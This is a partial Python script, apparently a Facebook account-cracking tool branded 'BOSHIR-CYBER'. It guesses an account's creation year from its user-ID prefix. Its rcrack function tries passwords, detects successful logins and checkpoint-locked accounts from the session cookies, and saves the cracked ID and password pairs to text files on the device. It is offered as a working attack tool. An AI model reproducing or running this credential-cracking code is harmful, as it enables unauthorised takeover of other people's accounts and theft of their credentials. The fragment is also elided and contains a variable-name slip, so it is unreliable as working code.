...
def BOSHIR(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :BOSHIR = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :BOSHIR = '√ 2009'
        elif uid[:8] in ['10000000']        :BOSHIR= '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:BOSHIR = ' 2010'
        elif uid[:6] in ['100001']          :BOSHIR = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :BOSHIR = '√ 2011/2012'
        elif uid[:6] in ['100004']          :BOSHIR= '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :BOSHIR = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :BOSHIR = '√ 2014/2015'
        elif uid[:6] in ['100009']          :BOSHIR= '√ 2015'
        elif uid[:5] in ['10001']           :BOSHIR= '√ 2015/2016'
        elif uid[:5] in ['10002']           :BOSHIR = '√ 2016/2017'
        elif uid[:5] in ['10003']           :BOSHIR = '√ 2018/2019'
        elif uid[:5] in ['10004']           :BOSHIR = '√ 2019/2020'
        elif uid[:5] in ['10005']           :BOSHIR = '√ 2020'
        elif uid[:5] in ['10006','10007','']:BOSHIR = '√ 2021'
        elif uid[:5] in ['10008']           :BOSHIR = '√ 2022'
        elif uid[:5] in ['10009']           :BOSHIR = '√ 2023'
        else:BOSHIR =''
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/BOSHIR.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [BOSHIR-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BOSHIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{random.choice(my_color)}BOSHIR-CYBER{x}][%s|%s][OK:{random.choice(my_color)}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
